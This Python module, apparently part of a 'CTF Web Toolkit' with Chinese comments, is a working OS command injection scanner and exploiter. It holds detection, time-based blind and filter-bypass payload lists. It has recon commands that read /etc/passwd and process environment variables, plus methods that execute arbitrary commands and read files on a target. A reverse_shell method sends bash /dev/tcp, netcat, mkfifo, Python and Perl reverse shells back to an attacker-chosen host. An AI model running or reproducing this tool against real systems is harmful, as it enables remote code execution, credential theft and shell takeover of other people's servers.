"""
CTF Web Toolkit - Command Injection Module
支持：OS 命令注入检测 / 盲注 / 带外数据 / 绕过技巧
"""

import time
from typing import Optional, List
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 检测 Payload ──────────────────────────────
DETECT_PAYLOADS_UNIX = [
    # 命令分隔符
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    # 换行符
    "\nid",
    "\r\nid",
    # URL 编码
    ";%20id",
    "%0aid",
    # 特殊字符
    "';id;'",
    "\";id;\"",
]

DETECT_PAYLOADS_WIN = [
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "; whoami",
    "`whoami`",
    "$(whoami)",
    "%0awhoami",
]

# ── 延时检测 Payload（无回显）────────────────
TIME_PAYLOADS = [
    "; sleep {sec}",
    "| sleep {sec}",
    "|| sleep {sec}",
    "& sleep {sec}",
    "&& sleep {sec}",
    "`sleep {sec}`",
    "$(sleep {sec})",
    "%0asleep%20{sec}",
    "; ping -c {sec} 127.0.0.1",
    "| ping -c {sec} 127.0.0.1",
]

# ── 绕过过滤 Payload ──────────────────────────
BYPASS_PAYLOADS = [
    # 使用环境变量
    "${IFS}id",
    "$IFS$9id",
    "{cat,/etc/passwd}",
    # 引号绕过
    "i''d",
    'i""d',
    "i`echo`d",
    # 编码绕过
    "$(echo aWQ= | base64 -d)",  # echo 'id' | base64
    "$(printf '\\x69\\x64')",
    # 通配符绕过
    "/u?r/b?n/id",
    "/usr/b*/id",
    # 反斜杠绕过
    "i\\d",
    # 变量绕过
    "a=i;b=d;$a$b",
    # 拼接绕过（绕过关键字过滤）
    "cat /etc/pa'ss'wd",
    "c'a't /etc/passwd",
]

# ── 常用命令 ──────────────────────────────────
RECON_CMDS = {
    "whoami": "当前用户",
    "id": "用户 ID",
    "uname -a": "系统信息",
    "cat /etc/passwd": "用户列表",
    "cat /etc/os-release": "OS 版本",
    "pwd": "当前目录",
    "ls -la": "目录列表",
    "env": "环境变量",
    "ifconfig || ip addr": "网络信息",
    "netstat -an || ss -an": "网络连接",
    "ps aux": "进程列表",
    "cat /proc/self/environ": "进程环境变量",
}


class CMDInjectionScanner:
    def __init__(self, requester: Requester):
        self.req = requester

    def detect_echo(self, url: str, param: str, method: str = "GET") -> Optional[str]:
        """通过回显检测命令注入（Unix 和 Windows）"""
        section(f"命令注入检测: {param}")

        for payload in DETECT_PAYLOADS_UNIX:
            full = f"test{payload}"
            resp = _send(self.req, url, param, full, method)
            if resp and _has_cmd_output(resp.text):
                found("命令注入(Unix)", f"payload={payload!r}")
                return "unix"

        for payload in DETECT_PAYLOADS_WIN:
            full = f"test{payload}"
            resp = _send(self.req, url, param, full, method)
            if resp and ("NT AUTHORITY" in resp.text or "\\" in resp.text
                         and "Users" in resp.text):
                found("命令注入(Windows)", f"payload={payload!r}")
                return "windows"

        info("未发现命令注入（回显检测）")
        return None

    def detect_time(self, url: str, param: str,
                    sleep_sec: int = 5, method: str = "GET") -> bool:
        """时间盲注检测命令注入"""
        section(f"命令注入时间检测: {param}")
        # 基线
        t0 = time.time()
        _send(self.req, url, param, "normalvalue", method)
        baseline = time.time() - t0

        for template in TIME_PAYLOADS:
            payload = "test" + template.format(sec=sleep_sec)
            t0 = time.time()
            _send(self.req, url, param, payload, method)
            elapsed = time.time() - t0
            if elapsed >= sleep_sec * 0.8:
                found("命令注入(时间盲注)", f"payload={payload!r} 延迟={elapsed:.2f}s")
                return True

        info(f"时间检测未发现注入（基线={baseline:.2f}s）")
        return False

    def execute(self, url: str, param: str, cmd: str,
                method: str = "GET", separator: str = "; ") -> Optional[str]:
        """执行命令并提取输出"""
        section(f"执行命令: {cmd}")
        separators = ["; ", "| ", "|| ", "& ", "&& ", "\n", "`", "$(", "%0a"]

        for sep in separators:
            if sep == "`":
                payload = f"test`{cmd}`"
            elif sep == "$(" :
                payload = f"test$({cmd})"
            else:
                payload = f"test{sep}{cmd}"

            resp = _send(self.req, url, param, payload, method)
            if resp and _has_cmd_output(resp.text):
                output = _extract_output(resp.text)
                if output:
                    found("命令输出", output[:300])
                    return output

        # 尝试绕过方式
        for bypass in BYPASS_PAYLOADS[:5]:
            resp = _send(self.req, url, param, bypass, method)
            if resp and _has_cmd_output(resp.text):
                output = _extract_output(resp.text)
                if output:
                    found("命令输出(绕过)", output[:300])
                    return output

        err("命令执行失败")
        return None

    def recon(self, url: str, param: str, method: str = "GET") -> dict:
        """执行常用侦察命令"""
        section("目标侦察")
        results = {}
        for cmd, desc in RECON_CMDS.items():
            output = self.execute(url, param, cmd, method)
            if output:
                results[cmd] = output
                ok(f"  {desc}: 成功")
            else:
                info(f"  {desc}: 无输出")
        return results

    def reverse_shell(self, url: str, param: str,
                      lhost: str, lport: int, method: str = "GET",
                      shell_type: str = "bash") -> None:
        """生成并发送反弹 shell"""
        section(f"反弹 Shell: {lhost}:{lport}")
        shells = {
            "bash":   f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash2":  f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            "nc":     f"nc {lhost} {lport} -e /bin/bash",
            "nc2":    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "python": f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"",
            "perl":   f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        }
        cmd = shells.get(shell_type, shells["bash"])
        warn(f"  使用 nc -lvnp {lport} 监听")
        info(f"  Shell 命令: {cmd}")
        self.execute(url, param, cmd, method)

    def test_bypass(self, url: str, param: str, method: str = "GET") -> List[str]:
        """测试各种绕过过滤方式"""
        section("绕过测试")
        success = []
        for p in BYPASS_PAYLOADS:
            resp = _send(self.req, url, param, p, method)
            if resp and _has_cmd_output(resp.text):
                found("绕过成功", p)
                success.append(p)
        return success

    def read_file(self, url: str, param: str, filepath: str,
                  method: str = "GET") -> Optional[str]:
        """通过命令注入读取文件"""
        return self.execute(url, param, f"cat {filepath}", method)


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str, payload: str, method: str):
    try:
        if method.upper() == "GET":
            return req.get(url, params={param: payload})
        else:
            return req.post(url, data={param: payload})
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _has_cmd_output(text: str) -> bool:
    indicators = [
        "uid=", "gid=", "root", "www-data", "daemon",
        "Linux", "Ubuntu", "Debian", "CentOS", "MINGW",
        "NT AUTHORITY", "SYSTEM", "Administrator",
        "/bin/bash", "/bin/sh", "/home/",
        "total ", "drwx", "-rw-",
    ]
    return any(i in text for i in indicators)


def _extract_output(text: str) -> Optional[str]:
    """提取命令输出片段"""
    for indicator in ["uid=", "root:", "Linux", "total ", "drwx"]:
        idx = text.find(indicator)
        if idx >= 0:
            return text[idx:idx + 500]
    return text[:500] if text.strip() else None
